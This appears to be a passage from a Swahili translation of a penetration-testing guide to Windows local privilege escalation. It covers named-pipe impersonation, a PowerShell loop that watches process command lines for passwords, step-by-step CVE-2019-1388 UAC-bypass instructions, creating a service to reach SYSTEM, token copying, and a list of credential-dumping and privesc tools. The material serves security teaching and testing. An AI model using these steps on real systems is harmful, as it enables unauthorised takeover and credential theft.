Wakati data inatumwa kupitia pipe na **mteja**, **server** iliyoweka pipe ina uwezo wa **kuchukua utambulisho** wa **mteja**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **mchakato wa ruhusa** unaowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata ruhusa za juu** kwa kukubali utambulisho wa mchakato huo mara tu unapoingiliana na pipe uliyounda. Kwa maelekezo juu ya kutekeleza shambulio kama hilo, mwongozo wa kusaidia unaweza kupatikana [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Pia zana ifuatayo inaruhusu **kukamata mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

Wakati unapata shell kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo **inasafirisha akidi kwenye mstari wa amri**. Skripti iliyo hapa chini inakamata mistari ya amri za mchakato kila sekunde mbili na kulinganisha hali ya sasa na hali ya awali, ikitoa tofauti zozote.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji wa Hali ya Chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa kiolesura cha grafiki (kupitia console au RDP) na UAC imewezeshwa, katika toleo fulani la Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na mamlaka.

Hii inafanya iwezekane kupandisha mamlaka na kupita UAC kwa wakati mmoja kwa kutumia udhaifu huo huo. Zaidi ya hayo, hakuna haja ya kufunga chochote na faili ya binari inayotumika wakati wa mchakato, imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni ifuatayo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni muhimu kufuata hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Unaweza kupata faili zote muhimu na taarifa katika hazina ifuatayo ya GitHub:

https://github.com/jas502n/CVE-2019-1388

## Kutoka kwa Kiwango cha Msimamizi cha Kati hadi Juu / UAC Bypass

Soma hii ili **ujifunze kuhusu Viwango vya Uaminifu**:

{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **Kutoka kwa Uaminifu Juu hadi Mfumo**

### **Huduma Mpya**

Ikiwa tayari unafanya kazi kwenye mchakato wa Uaminifu Juu, **kupita kwa SYSTEM** kunaweza kuwa rahisi tu **kwa kuunda na kutekeleza huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Kutoka kwa mchakato wa High Integrity unaweza kujaribu **kuwezesha rekodi za AlwaysInstallElevated** na **kufunga** shell ya kurudi kwa kutumia _**.msi**_ wrapper.\
[Maelezo zaidi kuhusu funguo za rejista zinazohusika na jinsi ya kufunga pakiti ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una hizo haki za tokeni (labda utaona hii katika mchakato wa High Integrity), utaweza **kufungua karibu mchakato wowote** (sio michakato iliyo na ulinzi) kwa kutumia haki ya SeDebug, **kunakili tokeni** ya mchakato, na kuunda **mchakato wowote na tokeni hiyo**.\
Kutumia mbinu hii kawaida **huchaguliwa mchakato wowote unaotembea kama SYSTEM na haki zote za tokeni** (_ndiyo, unaweza kupata michakato ya SYSTEM bila haki zote za tokeni_).\
**Unaweza kupata** [**mfano wa msimbo unaotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii inatumika na meterpreter ili kupandisha hadhi katika `getsystem`. Mbinu hii inajumuisha **kuunda bomba na kisha kuunda/kutumia huduma kuandika kwenye bomba hilo**. Kisha, **server** iliyounda bomba hilo kwa kutumia haki ya **`SeImpersonate`** itakuwa na uwezo wa **kujifanya kuwa tokeni** ya mteja wa bomba (huduma) ikipata haki za SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu bomba za jina unapaswa kusoma hii**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kutoka kwa high integrity hadi System kwa kutumia bomba za jina unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa unafanikiwa **kudhibiti dll** inayopakiwa na **mchakato** unaotembea kama **SYSTEM** utaweza kutekeleza msimbo wowote kwa kutumia ruhusa hizo. Hivyo, Dll Hijacking pia ni muhimu kwa aina hii ya kupandisha hadhi, na zaidi, ikiwa ni rahisi **zaidi kufikia kutoka kwa mchakato wa high integrity** kwani itakuwa na **ruhusa za kuandika** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

{{#ref}}
https://github.com/sailay1996/RpcSsImpersonator
{{#endref}}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Zana bora ya kutafuta njia za kupandisha hadhi za ndani za Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia makosa ya usanidi na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imepatikana.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia makosa kadhaa ya usanidi na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia makosa ya usanidi**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Inatoa taarifa za kikao zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough katika eneo.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Inatoa taarifa za kuingia kutoka kwa Meneja wa Taarifa. Imepatikana.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Piga nywila zilizokusanywa kwenye kikoa**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uainishaji wa msingi wa privesc Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Tafuta udhaifu wa privesc uliojulikana (IMEFUTWA kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta udhaifu wa privesc uliojulikana (inahitaji kukusanywa kwa kutumia VisualStudio) ([**imekusanywa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Inatafuta mwenyeji akitafuta makosa ya usanidi (zaidi ni zana ya kukusanya taarifa kuliko privesc) (inahitaji kukusanywa) **(**[**imekusanywa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Inatoa taarifa za kuingia kutoka kwa programu nyingi (exe iliyokusanywa awali katika github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Angalia makosa ya usanidi (executable iliyokusanywa katika github). Haipendekezwi. Haifanyi kazi vizuri katika Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia makosa ya usanidi yanayoweza kutokea (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri katika Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa msingi wa chapisho hili (haihitaji accesschk kufanya kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma matokeo ya **systeminfo** na inapendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Inasoma matokeo ya **systeminfo** na inapendekeza exploits zinazofanya kazi (python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima uunde mradi kwa kutumia toleo sahihi la .NET ([ona hii](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo lililosakinishwa la .NET kwenye mwenyeji wa mwathirika unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeleo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
